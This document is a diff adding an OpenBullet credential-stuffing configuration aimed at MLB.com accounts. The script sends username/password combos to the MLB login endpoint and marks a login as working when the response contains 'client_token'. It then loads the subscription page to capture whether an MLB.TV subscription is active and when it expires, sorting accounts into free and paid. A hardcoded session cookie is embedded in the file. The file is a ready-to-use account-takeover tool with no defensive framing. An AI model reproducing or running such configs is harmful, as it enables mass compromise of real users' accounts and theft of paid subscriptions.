@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "mlb",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-04T20:06:50.9854007+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "https://securea.mlb.com/authenticate.do" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#POST_LOGIN REQUEST POST "https://securea.mlb.com/authenticate.do" AutoRedirect=TRUE 
+  CONTENT "uri=%2Faccount%2Flogin_register.jsp&registrationAction=identify&emailAddress=<USER>&password=<PASS>&submitButton=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "Cookie: s_lv_s=First%20Visit; __qca=P0-1265269647-1536086322548; AAMC_mlb_0=REGION%7C6; aam_uuid=34819138247529777880503564138363457505; notice_preferences=0:; notice_gdpr_prefs=0:; minUniq={\"minUID\":\"a7a6eaea65-86fd34cbf1-ad30221e84-1360c0f6c1-720a006819\"}; guid=9735221f42149de66f8efd81e7b236a9; appacc=mlb; minDaily={\"testMode\":false,\"dailyUser\":true}; minBuffer={\"_minEE0\":\"[]\",\"_minEE1\":\"[]\",\"minAnalytics\":\"{\\"clicks\\":[]}\"}; check=true; AMCVS_A65F776A5245B01B0A490D44%40AdobeOrg=1; s_cc=true; ipid=52563824; stUtil_cookie=1%7C52563824%7C6747590741536088297507; s_pvs=%5B%5BB%5D%5D; s_tps=%5B%5BB%5D%5D; s_ppvl=Major%2520League%2520Baseball%253A%2520Subscriptions%253A%2520MLB.TV%2520Sell%2520Page%2C22%2C22%2C974%2C1920%2C974%2C1920%2C1080%2C1%2CP; s_vi=[CS]v1|2DC76D04053114E4-4000012BC00007A7[CE]; mbox=PC#e3a7a7cd3eb84b2b87110e2a66314ca4.26_13#1537298430|session#9d08d75c37f94e19837418ff5d6bb62c#1536090690|check#true#1536088890; QSI_HistorySession=http%3A%2F%2Fmlb.mlb.com%2Fcampaign%2Flogin_register.jsp%3FflowId%3Dcommerce.cart.noUpfrontRegisPurchase%26c_id%3Dmlb%26keepWfParams%3Dtrue%26voucherCode%3DMLBTV_VOCHR%26sku%3D1001107599999919921303000%26campaignCode%3DMLBTV_CMPGN~1536088693970%7Chttps%3A%2F%2Fsecure.mlb.com%2Fenterworkflow.do%3FflowId%3Dregistration.logout%26c_id%3Dmlb~1536089361718; gpv_v48=Major%20League%20Baseball%3A%20Homepage; s_ppn=Major%20League%20Baseball%3A%20Homepage; s_ppv=Major%2520League%2520Baseball%253A%2520Homepage%2C21%2C21%2C974%2C1920%2C974%2C1920%2C1080%2C1%2CP; minSession={\"minSID\":\"6e218903e7-771cf76324-f20e118af2-51b32f2e50-6fcc5758c8\",\"minSessionSent\":true}; SESSION_1=wf_forwardUrl%3D%3D%3Dhttps%3A%2F%2Fwww.mlb.com%7Ewf_flowId%3D%3D%3Dregistration.connect.wizard%7Ewf_template%3D%3D%3Dmobile%7Ewf_c_id%3D%3D%3Dmlb%7Estage%3D%3D%3D3%7EflowId%3D%3D%3Dregistration.connect.wizard%7EforwardUrl%3D%3D%3Dhttps%3A%2F%2Fwww.mlb.com; s_getNewRepeat=1536089376446-New; s_lv=1536089376446; AMCV_A65F776A5245B01B0A490D44%40AdobeOrg=1099438348%7CMCIDTS%7C17779%7CMCMID%7C34705000012721358760470216711543081049%7CMCAAMLH-1536694177%7C6%7CMCAAMB-1536694177%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1536096577s%7CNONE%7CMCAID%7CNONE%7CMCSYNCSOP%7C411-17786%7CvVersion%7C2.1.0; s_sq=mlbglobal08%2Cmlbcom08%3D%2526pid%253DMajor%252520League%252520Baseball%25253A%252520Account%25253A%252520Account%252520Management%252520-%252520Login%25252FRegister%2526pidt%253D1%2526oid%253DLog%252520In%2526oidt%253D3%2526ot%253DSUBMIT%26mlbglobal08%252Cmlbcom08%3D%2526pid%253DMajor%252520League%252520Baseball%25253A%252520Homepage%2526pidt%253D1%2526oid%253Dhttps%25253A%25252F%25252Fsecurea.mlb.com%25252Fenterworkflow.do%25253FflowId%25253Dregistration.connect.wizard%252526c_id%25253Dmlb%252526template%25253Dmobile%2526ot%253DA" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<COOKIES(minDaily)>" LR "" "" Recursive=FALSE -> CAP "" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "client_token" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "client_token" 
+REQUEST GET "https://web-secure.mlb.com/enterworkflow.do?flowId=subscriptions.updatesubscription&c_id=mlb" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "You no longer have an active MLB.TV subscription." 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "You no longer have an active MLB.TV subscription." 
+PARSE "<SOURCE>" LR " text-subscription\">" "<" Recursive=FALSE -> CAP "active" "" "" 
+PARSE "<SOURCE>" LR "Your subscription expires on" "." Recursive=FALSE -> CAP "Expires on" "" "" 
